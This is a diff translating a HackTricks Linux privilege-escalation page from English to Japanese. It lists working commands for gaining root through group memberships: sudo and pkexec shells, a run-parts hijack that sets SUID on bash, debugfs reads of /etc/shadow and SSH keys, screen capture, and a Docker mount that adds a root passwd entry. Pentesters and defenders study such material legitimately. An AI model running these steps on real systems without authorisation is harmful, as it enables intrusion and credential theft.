@@ -1,13 +1,12 @@
-# Interesting Groups - Linux Privesc
+# 興味深いグループ - Linux Privesc
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Sudo/Admin Groups
+## Sudo/Admin グループ
 
-### **PE - Method 1**
+### **PE - メソッド 1**
 
-**Sometimes**, **by default (or because some software needs it)** inside the **/etc/sudoers** file you can find some of these lines:
-
+**時々**、**デフォルトで（またはいくつかのソフトウェアが必要とするために）** **/etc/sudoers** ファイル内にこれらの行のいくつかを見つけることができます：
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -15,48 +14,36 @@
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
+これは、**sudoまたはadminグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。
 
-This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+この場合、**rootになるには次のように実行するだけです**:
 ```
 sudo su
 ```
-
 ### PE - Method 2
 
-Find all suid binaries and check if there is the binary **Pkexec**:
-
+すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるかどうかを確認します:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-
-If you find that the binary **pkexec is a SUID binary** and you belong to **sudo** or **admin**, you could probably execute binaries as sudo using `pkexec`.\
-This is because typically those are the groups inside the **polkit policy**. This policy basically identifies which groups can use `pkexec`. Check it with:
-
+バイナリ **pkexec が SUID バイナリ** であり、あなたが **sudo** または **admin** に属している場合、`pkexec` を使用して sudo としてバイナリを実行できる可能性があります。\
+これは通常、これらが **polkit ポリシー** 内のグループであるためです。このポリシーは基本的にどのグループが `pkexec` を使用できるかを特定します。次のコマンドで確認してください:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
+そこでは、どのグループが**pkexec**を実行することを許可されているか、そして**デフォルトで**いくつかのLinuxディストリビューションでは、**sudo**および**admin**グループが表示されるかを見つけることができます。
 
-There you will find which groups are allowed to execute **pkexec** and **by default** in some linux disctros the groups **sudo** and **admin** appear.
-
-To **become root you can execute**:
-
+**rootになるには、次のコマンドを実行できます**:
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-
-If you try to execute **pkexec** and you get this **error**:
-
+**pkexec**を実行しようとしたときにこの**エラー**が表示される場合：
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-
-**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
-
+**権限がないからではなく、GUIなしで接続されていないからです**。この問題の回避策はここにあります: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -67,39 +54,31 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
-
 ## Wheel Group
 
-**Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:
-
+**時々**、**デフォルトで** **/etc/sudoers** ファイル内にこの行を見つけることができます:
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
+これは、**wheelグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。
 
-This means that **any user that belongs to the group wheel can execute anything as sudo**.
-
-If this is the case, to **become root you can just execute**:
-
+この場合、**rootになるには、単に次を実行すればよい**:
 ```
 sudo su
 ```
-
 ## Shadow Group
 
-Users from the **group shadow** can **read** the **/etc/shadow** file:
-
+**shadow** グループのユーザーは **/etc/shadow** ファイルを **読み取る** ことができます:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
+なので、ファイルを読み、**ハッシュをいくつかクラック**してみてください。
 
-So, read the file and try to **crack some hashes**.
+## スタッフグループ
 
-## Staff Group
+**staff**: ユーザーがルート権限を必要とせずにシステムにローカルな変更を加えることを許可します（`/usr/local`）。 `/usr/local/bin`内の実行可能ファイルは、すべてのユーザーのPATH変数に含まれており、同じ名前の`/bin`および`/usr/bin`内の実行可能ファイルを「上書き」する可能性があります。 監視/セキュリティに関連する「adm」グループと比較してください。 [\[source\]](https://wiki.debian.org/SystemGroups)
 
-**staff**: Allows users to add local modifications to the system (`/usr/local`) without needing root privileges (note that executables in `/usr/local/bin` are in the PATH variable of any user, and they may "override" the executables in `/bin` and `/usr/bin` with the same name). Compare with group "adm", which is more related to monitoring/security. [\[source\]](https://wiki.debian.org/SystemGroups)
-
-In debian distributions, `$PATH` variable show that `/usr/local/` will be run as the highest priority, whether you are a privileged user or not.
-
+debianディストリビューションでは、`$PATH`変数は、特権ユーザーであろうとなかろうと、`/usr/local/`が最優先で実行されることを示しています。
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -107,11 +86,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
+`/usr/local`にあるいくつかのプログラムをハイジャックできれば、簡単にrootを取得できます。
 
-If we can hijack some programs in `/usr/local`, we can easy to get root.
-
-Hijack `run-parts` program is a way to easy to get root, because most of program will run a `run-parts` like (crontab, when ssh login).
-
+`run-parts`プログラムをハイジャックすることは、rootを取得する簡単な方法です。なぜなら、ほとんどのプログラムは`run-parts`を実行するからです（crontabやSSHログイン時など）。
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -119,9 +96,7 @@ $ cat /etc/crontab | grep run-parts
 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
-
-or When a new ssh session login.
-
+または新しいsshセッションにログインしたとき。
 ```bash
 $ pspy64
 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
@@ -134,9 +109,7 @@ $ pspy64
 2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
 2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
 ```
-
-**Exploit**
-
+**エクスプロイト**
 ```bash
 # 0x1 Add a run-parts script in /usr/local/bin/
 $ vi /usr/local/bin/run-parts
@@ -155,13 +128,11 @@ $ ls -la /bin/bash
 # 0x5 root it
 $ /bin/bash -p
 ```
+## ディスクグループ
 
-## Disk Group
+この特権はほぼ**ルートアクセスと同等**であり、マシン内のすべてのデータにアクセスできます。
 
-This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.
-
-Files:`/dev/sd[a-z][1-9]`
-
+ファイル: `/dev/sd[a-z][1-9]`
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -170,57 +141,47 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-
-Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:
-
+debugfsを使用すると、**ファイルを書き込む**こともできることに注意してください。たとえば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-
-However, if you try to **write files owned by root** (like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.
+しかし、**rootが所有するファイル**（例えば`/etc/shadow`や`/etc/passwd`）に**書き込もうとすると**、「**Permission denied**」エラーが発生します。
 
 ## Video Group
 
-Using the command `w` you can find **who is logged on the system** and it will show an output like the following one:
-
+コマンド`w`を使用すると、**システムにログインしているユーザー**を見つけることができ、次のような出力が表示されます：
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
+**tty1**は、ユーザー**yossiが物理的に**マシンのターミナルにログインしていることを意味します。
 
-The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.
-
-The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
-
+**videoグループ**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。そのためには、**画面上の現在の画像を生データで取得**し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-
-To **open** the **raw image** you can use **GIMP**, select the \*\*`screen.raw` \*\* file and select as file type **Raw image data**:
+**生の画像**を**開く**には、**GIMP**を使用し、**`screen.raw`**ファイルを選択し、ファイルタイプとして**Raw image data**を選択します：
 
 ![](<../../../images/image (463).png>)
 
-Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):
+次に、幅と高さを画面で使用されているものに変更し、異なる画像タイプを確認して（画面をより良く表示するものを選択します）：
 
 ![](<../../../images/image (317).png>)
 
 ## Root Group
 
-It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...
+デフォルトでは、**rootグループのメンバー**は、**サービス**の設定ファイルや**ライブラリ**ファイル、または特権昇格に使用できる**他の興味深いもの**を**変更**するアクセス権を持っているようです...
 
-**Check which files root members can modify**:
-
+**rootメンバーが変更できるファイルを確認する**：
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
+## Dockerグループ
 
-## Docker Group
-
-You can **mount the root filesystem of the host machine to an instance’s volume**, so when the instance starts it immediately loads a `chroot` into that volume. This effectively gives you root on the machine.
-
+ホストマシンの**ルートファイルシステムをインスタンスのボリュームにマウント**できます。これにより、インスタンスが起動するとすぐにそのボリュームに`chroot`がロードされます。これにより、実質的にマシン上でルート権限を得ることができます。
 ```bash
 docker image #Get images from the docker service
 
@@ -232,33 +193,32 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-
-Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:
+最後に、以前の提案が気に入らない場合や、何らかの理由で機能しない場合（docker api firewall？）、ここで説明されているように、**特権コンテナを実行してそこから脱出する**ことを試みることができます：
 
 {{#ref}}
 ../docker-security/
 {{#endref}}
 
-If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**
+dockerソケットに書き込み権限がある場合は、[**dockerソケットを悪用して特権を昇格させる方法に関するこの投稿を読んでください**](../#writable-docker-socket)**。**
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
 {% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
 
-## lxc/lxd Group
+## lxc/lxd グループ
 
 {{#ref}}
 ./
 {{#endref}}
 
-## Adm Group
+## Adm グループ
 
-Usually **members** of the group **`adm`** have permissions to **read log** files located inside _/var/log/_.\
-Therefore, if you have compromised a user inside this group you should definitely take a **look to the logs**.
+通常、**`adm`** グループの**メンバー**は、_ /var/log/_ 内にある**ログ**ファイルを**読む**権限を持っています。\
+したがって、このグループ内のユーザーを侵害した場合は、**ログを確認する**べきです。
 
-## Auth group
+## Auth グループ
 
-Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.\
-These permissions may be abused with the following exploit to **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+OpenBSD内では、**auth** グループは通常、_**/etc/skey**_ および _**/var/db/yubikey**_ フォルダーに書き込むことができます。\
+これらの権限は、以下のエクスプロイトを使用して**特権を昇格させる**ために悪用される可能性があります：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 
 {{#include ../../../banners/hacktricks-training.md}}
